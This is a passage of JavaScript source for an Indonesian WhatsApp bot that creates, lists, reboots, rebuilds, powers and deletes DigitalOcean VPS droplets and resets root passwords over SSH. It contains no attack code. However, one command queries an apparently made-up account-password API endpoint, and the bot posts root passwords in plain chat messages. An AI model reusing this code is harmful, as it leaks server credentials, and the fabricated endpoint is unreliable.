Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n\n`;
                });
            }

            // List dari akun kedua
            mesej += `===== listdroplet 2 =====\n`;
            if (droplets2.length === 0) {
                mesej += 'Tidak ada droplet yang tersedia di akun kedua!\n\n';
            } else {
                droplets2.forEach(droplet => {
                    const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
                    const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
                    mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n\n`;
                });
            }

            // Kirim pesan dengan tombol Buy VPS saja
            conn.sendMessage(m.chat, {
                text: mesej,
                footer: `© 2025 ${botname}`,
                headerType: 1,
                viewOnce: true,
                buttons: [
                    { buttonId: `.buyvps`, buttonText: { displayText: 'Buy VPS' }, type: 1 }
                ],
                contextInfo: {
                    isForwarded: true, 
                    mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
                }
            }, { quoted: m });

        }).catch(err => {
            Reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
        });
    } catch (err) {
        Reply('Terjadi kesalahan saat memproses permintaan: ' + err);
    }
}
break;

case 'listdroplet': { 
    if (!isCreator) return Reply(mess.owner);

    try {
        // Ambil data droplets dari DigitalOcean API
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
            headers: { Authorization: "Bearer " + global.apiDigitalOcean }
        });

        const data = await response.json();
        const droplets = data.droplets || [];

        let totalvps = droplets.length;
        let totalActiveDroplets = droplets.filter(d => d.status === "active").length;
        let mesej = `🌐 *List Droplet Digital Ocean Kamu:* ${totalvps} 🔽\n\n`;

        if (totalvps === 0) {
            mesej += '⚠️ Tidak ada droplet yang tersedia!';
        } else {
            for (let droplet of droplets) {
                const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
                const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
                
                mesej += `🖥️ *Droplet ID:* ${droplet.id}
📛 Hostname: ${droplet.name} 
👤 Username: Root 
🌍 IP: ${ipAddress} 
💾 RAM: ${droplet.memory} MB 
⚡ CPU: ${droplet.vcpus} CPU 
🖥️ OS: ${droplet.image.distribution} 
🗄️ Storage: ${droplet.disk} GB 
📌 Status: ${droplet.status.toUpperCase()}

────────────────────\n`; 
            }

            // Tambahkan total droplet aktif di bagian bawah
            mesej += `\n✅ *Total Droplet yang bisa dipakai:* ${totalActiveDroplets} dari ${totalvps}`;
        }

        // Kirim pesan dengan tombol "Buy VPS"
        await conn.sendMessage(m.chat, {
            text: mesej,
            footer: `© 2025 ${botname}`,
            headerType: 1,
            viewOnce: true,
            buttons: [
                { buttonId: `.buyvps`, buttonText: { displayText: 'Buy Vps' }, type: 1 }
            ],
            contextInfo: {
                isForwarded: true, 
                mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
            }
        }, { quoted: m });

    } catch (err) {
        m.reply('❌ Terjadi kesalahan saat mengambil data droplet: ' + err);
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'restartvps': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'rebuild': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
conn.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'sisadropletall': {
  if (!isCreator) return Reply(mess.owner)

  async function getDropletInfo(apiToken) {
    try {
      const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
        headers: {
          Authorization: `Bearer ${apiToken}`,
        },
      });

      const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
        headers: {
          Authorization: `Bearer ${apiToken}`,
        },
      });

      if (accountResponse.status === 200 && dropletsResponse.status === 200) {
        const dropletLimit = accountResponse.data.account.droplet_limit;
        const dropletsCount = dropletsResponse.data.droplets.length;
        const remainingDroplets = dropletLimit - dropletsCount;

        return {
          dropletLimit,
          remainingDroplets,
          totalDroplets: dropletsCount,
        };
      } else {
        throw new Error('Gagal mendapatkan data akun DigitalOcean atau droplet!');
      }
    } catch (err) {
      return err;
    }
  }

  async function sisadropletHandler() {
    try {
      if (!isCreator) {
        return Reply(mess.owner);
      }

      // Ambil info droplet dari akun pertama
      const dropletInfo1 = await getDropletInfo(global.apiDigitalOcean);
      const message1 = `Akun Pertama:\nSisa droplet yang dapat kamu pakai: ${dropletInfo1.remainingDroplets}\nTotal droplet terpakai: ${dropletInfo1.totalDroplets}`;

      // Ambil info droplet dari akun kedua
      const dropletInfo2 = await getDropletInfo(global.apiDigitalOcean2);
      const message2 = `Akun Kedua:\nSisa droplet yang dapat kamu pakai: ${dropletInfo2.remainingDroplets}\nTotal droplet terpakai: ${dropletInfo2.totalDroplets}`;

      // Kirim hasil ke pengguna
      Reply(`${message1}\n\n${message2}`);
    } catch (err) {
      Reply(`Terjadi kesalahan: ${err}`);
    }
  }

  sisadropletHandler();
}
break;

case 'sisadroplet': {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

case 'startvps':
case 'turnon': {
    if (!isCreator) return Reply(mess.owner);
    let dropletId = args[0];
    if (!dropletId) return Reply('⚠️ ID droplet belum diberikan!');

    async function turnOnDroplet() {
        try {
            const response = await axios.post(
                `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
                {
                    type: 'power_on',
                },
                {
                    headers: {
                        'Content-Type': 'application/json',
                        Authorization: `Bearer ${global.apiDigitalOcean}`,
                    },
                }
            );

            const currentDate = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

            if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
                Reply(`✅ Sukses! VPS (droplet) sedang dihidupkan... 🔼\n🕒 Waktu: ${currentDate}`);
            } else {
                Reply(`❌ Gagal menghidupkan VPS (droplet).\n🕒 Waktu: ${currentDate}`);
            }
        } catch (err) {
            const currentDate = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
            Reply(`⚠️ Terjadi kesalahan saat menghidupkan VPS (droplet): ${err.message}\n🕒 Waktu: ${currentDate}`);
        }
    }
    turnOnDroplet();
}
break;

case 'stopvps':
case 'turnoff': {
    if (!isCreator) return Reply(mess.owner);
    let dropletId = args[0];
    if (!dropletId) return Reply('⚠️ ID droplet belum diberikan!');

    async function turnOffDroplet() {
        try {
            const response = await axios.post(
                `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
                {
                    type: 'power_off',
                },
                {
                    headers: {
                        'Content-Type': 'application/json',
                        Authorization: `Bearer ${global.apiDigitalOcean}`,
                    },
                }
            );

            const currentDate = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

            if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
                Reply(`✅ Sukses! VPS (droplet) sedang dimatikan... 🔻\n🕒 Waktu: ${currentDate}`);
            } else {
                Reply(`❌ Gagal mematikan VPS (droplet).\n🕒 Waktu: ${currentDate}`);
            }
        } catch (err) {
            const currentDate = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
            Reply(`⚠️ Terjadi kesalahan saat mematikan VPS (droplet): ${err.message}\n🕒 Waktu: ${currentDate}`);
        }
    }
    turnOffDroplet();
}
break;

case 'resetpwvps': {
    if (!isCreator) return Reply(mess.owner);

    // Memisahkan input teks
    let t = text.split('|');
    if (t.length < 3) return Reply(`⚠️ *Format salah!*\nPenggunaan: ${command} ipvps|password|passwordbaru`);

    let ipvps = t[0];
    let passwd = t[1];
    let pw = t[2];

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const connCommand = `${global.bash}`;
    const conn = new Client();

    // Fungsi untuk mendapatkan waktu WIB
    const getWIBTime = () => {
        const date = new Date();
        const options = { timeZone: 'Asia/Jakarta', hour12: false };
        return date.toLocaleString('id-ID', options);
    };

    const startTime = getWIBTime(); // Catat waktu mulai

    Reply(`🔐 *Mengubah Password VPS Dimulai...*\n⏰ Waktu Mulai: ${startTime}`);

    conn.on('ready', () => {
        conn.exec(connCommand, (err, stream) => {
            if (err) throw err;

            stream.on('close', (code, signal) => {
                const endTime = getWIBTime(); // Catat waktu selesai
                console.log(`Stream closed with code ${code} and signal ${signal}`);
                Reply(`✅ *Password VPS Berhasil Diubah!*\n\n📋 *Detail VPS:*\n- 🌐 IP VPS: ${ipvps}\n- 🔑 Password Baru: ${pw}\n\n⏰ *Waktu Proses:*\n- Mulai: ${startTime}\n- Selesai: ${endTime}\n\n💡 *Catatan:* Simpan data ini dengan baik. Terima kasih! ✨`);
                conn.end();
            }).on('data', (data) => {
                // Mengirimkan perintah melalui stream
                stream.write(`${global.tokeninstall}\n`);
                stream.write('8\n');
                stream.write(`${pw}\n`);
                stream.write(`${pw}\n`);
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        Reply('❌ *IP atau Password Salah!*');
    }).connect(connSettings);
}
break;

case 'cekvps': case 'cekdroplet': {
    if (!isCreator) return Reply(mess.owner);

    const axios = require('axios');

    // Fungsi untuk mendapatkan informasi droplet berdasarkan ID
    async function getDropletInfoById(dropletId) {
        try {
            const dropletResponse = await axios.get(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                headers: {
                    Authorization: `Bearer ${global.apiDigitalOcean}`,
                },
            });

            if (dropletResponse.status === 200) {
                const droplet = dropletResponse.data.droplet;

                // Konversi waktu pembuatan ke format yang lebih mudah dibaca
                const createdAt = new Date(droplet.created_at);
                const formattedDate = createdAt.toLocaleString('id-ID', { 
                    timeZone: 'Asia/Jakarta', 
                    weekday: 'long', 
                    year: 'numeric', 
                    month: 'long', 
                    day: 'numeric', 
                    hour: '2-digit', 
                    minute: '2-digit', 
                    second: '2-digit' 
                });

                return {
                    name: droplet.name,
                    ip: droplet.networks.v4[0]?.ip_address || "Tidak ada IP ditemukan",
                    status: droplet.status === "active" ? "Aktif ✅" : "Tidak Aktif ❌", // Status VPS
                    createdAt: formattedDate, // Tanggal & waktu pembuatan
                };
            } else {
                throw new Error("Gagal mendapatkan data droplet!");
            }
        } catch (err) {
            throw new Error(`Terjadi kesalahan saat mengambil data droplet: ${err.message}`);
        }
    }

    // Fungsi untuk menangani perintah cekvps
    async function cekvpsHandler(dropletId) {
        try {
            if (!dropletId) return Reply("❌ Harap masukkan ID Droplet!");

            const dropletInfo = await getDropletInfoById(dropletId);

            Reply(
                `🔹 **Detail VPS** 🔹\n\n` +
                `📌 **ID VPS**: ${dropletId}\n` +
                `💻 **Nama VPS**: ${dropletInfo.name}\n` +
                `🌍 **IP VPS**: ${dropletInfo.ip}\n` +
                `⚡ **Status VPS**: ${dropletInfo.status}\n` +
                `📅 **Dibuat Pada**: ${dropletInfo.createdAt}`
            );
        } catch (err) {
            Reply(`❌ Terjadi kesalahan: ${err.message}`);
        }
    }

    // Ambil ID droplet dari input pengguna
    const dropletId = args[0]; // Menggunakan input dari pengguna
    cekvpsHandler(dropletId);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'deldroplet': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'changeapido':  
    if (!isCreator) return Reply(mess.owner);  
    if (text || m.quoted) {   
        const args = (m.quoted ? m.quoted.text : text).split(' ');  
        if (args.length !== 2) {
            return Reply(`*Format salah!*\nContoh: ${prefix + command} 1 <TOKEN-API>\nAtau: ${prefix + command} 2 <TOKEN-API>`);
        }

        const pilihan = args[0];  
        const token = args.slice(1).join(' ');  

        if (pilihan === '1') {
            global.apiDigitalOcean = token;
            Reply('✅ Berhasil mengganti Token API DigitalOcean 1');
        } else if (pilihan === '2') {
            global.apiDigitalOcean2 = token;
            Reply('✅ Berhasil mengganti Token API DigitalOcean 2');
        } else {
            return Reply(`⚠️ Pilihan harus *1* atau *2*!\nContoh: ${prefix + command} 1 <TOKEN-API>`);
        }
    } else {  
        return Reply(`*Format salah!*\nContoh: ${prefix + command} 1 <TOKEN-API>\nAtau: ${prefix + command} 2 <TOKEN-API>`);  
    }  
    break;

case 'cekakunv1':
    if (!isCreator) return Reply(mess.owner);

    // Pilih API yang digunakan berdasarkan variabel global
    const selectedAPI = global.changeapido === 2 ? global.apiDigitalOcean2 : global.apiDigitalOcean;

    const getAccountInfo = async () => {
        try {
            const response = await fetch('https://api.digitalocean.com/v2/account', {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${selectedAPI}`
                }
            });

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            const data = await response.json();
            return data;
        } catch (error) {
            console.error('Error fetching account info:', error);
            return null;
        }
    };

    const getPasswordInfo = async () => {
        try {
            const response = await fetch('https://api.digitalocean.com/v2/account/password', {  // Sesuaikan endpoint jika perlu
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${selectedAPI}`
                }
            });

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            const data = await response.json();
            return data;
        } catch (error) {
            console.error('Error fetching password info:', error);
            return null;
        }
    };

    const accountInfo = await getAccountInfo();
    const passwordInfo = await getPasswordInfo();

    if (accountInfo && passwordInfo) {
        const account = accountInfo.account;
        const password = passwordInfo.password;  // Sesuaikan dengan struktur respons sebenarnya
        const responseText = `
🔹 **Account Info:**
- **Name:** ${account.name}
- **Email:** ${account.email}
- **Droplet Limit:** ${account.droplet_limit}
- **Floating IP Limit:** ${account.floating_ip_limit}
- **Status:** ${account.status}
- **Team Name:** ${account.team?.name || 'N/A'}
- **Password:** ${password}
🛠 **Using API:** ${global.changeapido === 2 ? 'apiDigitalOcean2' : 'apiDigitalOcean'}
        `;
        Reply(responseText);
    } else {
        Reply('❌ Gagal mengambil informasi akun atau password.');
    }
    break;

case 'cvps2': {
  if (!isCreator) return Reply(mess.owner)
  let t = text.split(',');
if (t.length < 4) return Reply(`*Format salah!*\nPenggunaan: ${prefix}cvps hostname,region,osversi,ram`)

    let hostname = t[0];
    let regions = t[1];
    let ram = t[2];
    let osvps = t[3];
    
  try {
    let dropletData = {
      name: hostname,
      region: regions,
      size: ram,
      image: osvps,
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['々 IjulTaka || 乂']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`\`\`\`Tunggu Sebentar...\`\`\``);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `*\`VPS berhasil dibuat √\`*\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n\n`;
      
      messageText += `*\`SPEKTIFIKASI\`*\n\n`;
      
      messageText += `HOSTNAME: ${hostname}\n`;
      messageText += `REGION: ${regions}\n`;
      messageText += `RAM: ${ram}\n`;
      messageText += `OS + VERSI: ${osvps}\n`;

      await conn.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break

case 'cvps3': {
  if (!isCreator) return Reply(mess.owner);
  
  let t = text.split(',');
  if (t.length < 5) return Reply(`*Format salah!*\nPenggunaan: ${prefix}cvps hostname,region,osversi,ram,akun\n\nAkun: 1 (apiDigitalOcean) atau 2 (apiDigitalOcean2)`);

  let hostname = t[0];
  let regions = t[1];
  let ram = t[2];
  let osvps = t[3];
  let accountChoice = t[4];

  // Menentukan API Key berdasarkan pilihan akun
  let apiKey;
  if (accountChoice === '1') {
    apiKey = global.apiDigitalOcean;
  } else if (accountChoice === '2') {
    apiKey = global.apiDigitalOcean2;
  } else {
    return Reply(`*Pilihan akun tidak valid!*\nGunakan 1 (apiDigitalOcean) atau 2 (apiDigitalOcean2).`);
  }

  try {
    let dropletData = {
      name: hostname,
      region: regions,
      size: ram,
      image: osvps,
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['々 IjulTaka || 乂']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + apiKey
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      Reply(`\`\`\`Tunggu Sebentar...\`\`\``);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + apiKey
        }
      });

      let dropletData = await dropletResponse.json();
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `*\`VPS berhasil dibuat √\`*\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n\n`;

      messageText += `*\`SPEKTIFIKASI\`*\n\n`;

      messageText += `HOSTNAME: ${hostname}\n`;
      messageText += `REGION: ${regions}\n`;
      messageText += `RAM: ${ram}\n`;
      messageText += `OS + VERSI: ${osvps}\n`;
      messageText += `Akun Digunakan: ${accountChoice === '1' ? 'apiDigitalOcean' : 'apiDigitalOcean2'}\n`;

      await conn.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }
}
break;

case 'createvps2': {
    if (!isCreator) return Reply(mess.owner)
    let sections = [
        {
            title: '# UBUNTU 20.04 API 1&2',
            highlight_label: 'Ubuntu 20.04 Api 1&2',
            rows: [
                {
                    title: 'VPS 1 GB 1 CORE API 1',
                    description: `1GB 1C Os Ubuntu 20 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-1vcpu-1gb,ubuntu-20-04-x64,1`
                },
                {
                    title: 'VPS 1 GB 1 CORE API 2',
                    description: `1GB 1C Os Ubuntu 20 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-1vcpu-1gb,ubuntu-20-04-x64,2`
                },
                {
                    title: 'VPS 2 GB 1 CORE API 1',
                    description: `2GB 1C Os Ubuntu 20 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-1vcpu-2gb,ubuntu-20-04-x64,1`
                },
                {
                    title: 'VPS 2 GB 1 CORE API 2',
                    description: `2GB 1C Os Ubuntu 20 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-1vcpu-2gb,ubuntu-20-04-x64,2`
                },
                {
                    title: 'VPS 4 GB 2 CORE API 1',
                    description: `4GB 2C Os Ubuntu 20 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-2vcpu-4gb,ubuntu-20-04-x64,1`
                },
                {
                    title: 'VPS 4 GB 2 CORE API 2',
                    description: `4GB 2C Os Ubuntu 20 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-2vcpu-4gb,ubuntu-20-04-x64,2`
                },
                {
                    title: 'VPS 8 GB 4 CORE API 1',
                    description: `8GB 4C Os Ubuntu 20 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-4vcpu-8gb,ubuntu-20-04-x64,1`
                },
                {
                    title: 'VPS 8 GB 4 CORE API 2',
                    description: `8GB 4C Os Ubuntu 20 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-4vcpu-8gb,ubuntu-20-04-x64,2`
                },
                {
                    title: 'VPS 16 GB 4 CORE API 1',
                    description: `16GB 4C Os Ubuntu 20 Region Nyc3`, 
                    id: `.cvps3 root,nyc3,s-4vcpu-16gb-amd,ubuntu-20-04-x64,1`
                },
                {
                    title: 'VPS 16 GB 4 CORE API 2',
                    description: `16GB 4C Os Ubuntu 20 Region Nyc3`, 
                    id: `.cvps3 root,nyc3,s-4vcpu-16gb-amd,ubuntu-20-04-x64,2`
                }
            ]
        },
        {
            title: '# UBUNTU 22.04 API 1&2', 
            highlight_label: 'System Information',
            rows: [
                {
                    title: 'VPS 1 GB 1 CORE API 1',
                    description: `1GB 1C Os Ubuntu 22 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-1vcpu-1gb,ubuntu-22-04-x64,1`
                },
                {
                    title: 'VPS 1 GB 1 CORE API 2',
                    description: `1GB 1C Os Ubuntu 22 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-1vcpu-1gb,ubuntu-22-04-x64,2`
                },
                {
                    title: 'VPS 2 GB 1 CORE API 1',
                    description: `2GB 1C Os Ubuntu 22 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-1vcpu-2gb,ubuntu-22-04-x64,1`
                },
                {
                    title: 'VPS 2 GB 1 CORE API 2',
                    description: `2GB 1C Os Ubuntu 22 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-1vcpu-2gb,ubuntu-22-04-x64,2`
                },
                {
                    title: 'VPS 4 GB 2 CORE API 1',
                    description: `4GB 2C Os Ubuntu 22 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-2vcpu-4gb,ubuntu-22-04-x64,1`
                },
                {
                    title: 'VPS 4 GB 2 CORE API 2',
                    description: `4GB 2C Os Ubuntu 22 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-2vcpu-4gb,ubuntu-22-04-x64,2`
                },
                {
                    title: 'VPS 8 GB 4 CORE API 1',
                    description: `8GB 4C Os Ubuntu 22 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-4vcpu-8gb,ubuntu-22-04-x64,1`
                },
                {
                    title: 'VPS 8 GB 4 CORE API 2',
                    description: `8GB 4C Os Ubuntu 22 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-4vcpu-8gb,ubuntu-22-04-x64,2`
                },
                {
                    title: 'VPS 16 GB 4 CORE API 1',
                    description: `16GB 4C Os Ubuntu 22 Region Nyc3`, 
                    id: `.cvps3 root,nyc3,s-4vcpu-16gb-amd,ubuntu-22-04-x64,1`
                },
                {
                    title: 'VPS 16 GB 4 CORE API 2',
                    description: `16GB 4C Os Ubuntu 22 Region Nyc3`, 
                    id: `.cvps3 root,nyc3,s-4vcpu-16gb-amd,ubuntu-22-04-x64,2`
                }
            ]
        },
        {
            title: '# UBUNTU 24.04 API 1&2', 
            highlight_label: 'System Information',
            rows: [
                {
                    title: 'VPS 1 GB 1 CORE API 1',
                    description: `1GB 1C Os Ubuntu 24 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-1vcpu-1gb,ubuntu-24-04-x64,1`
                },
                {
                    title: 'VPS 1 GB 1 CORE API 2',
                    description: `1GB 1C Os Ubuntu 24 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-1vcpu-1gb,ubuntu-24-04-x64,2`
                },
                {
                    title: 'VPS 2 GB 1 CORE API 1',
                    description: `2GB 1C Os Ubuntu 24 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-1vcpu-2gb,ubuntu-24-04-x64,1`
                },
                {
                    title: 'VPS 2 GB 1 CORE API 2',
                    description: `2GB 1C Os Ubuntu 24 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-1vcpu-2gb,ubuntu-24-04-x64,2`
                },
                {
                    title: 'VPS 4 GB 2 CORE API 1',
                    description: `4GB 2C Os Ubuntu 24 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-2vcpu-4gb,ubuntu-24-04-x64,1`
                },
                {
                    title: 'VPS 4 GB 2 CORE API 2',
                    description: `4GB 2C Os Ubuntu 24 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-2vcpu-4gb,ubuntu-24-04-x64,2`
                },
                {
                    title: 'VPS 8 GB 4 CORE API 1',
                    description: `8GB 4C Os Ubuntu 24 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-4vcpu-8gb,ubuntu-24-04-x64,1`
                },
                {
                    title: 'VPS 8 GB 4 CORE API 2',
                    description: `8GB 4C Os Ubuntu 24 Region Sg`, 
                    id: `.cvps3 root,sgp1,s-4vcpu-8gb,ubuntu-24-04-x64,2`
                },
                {
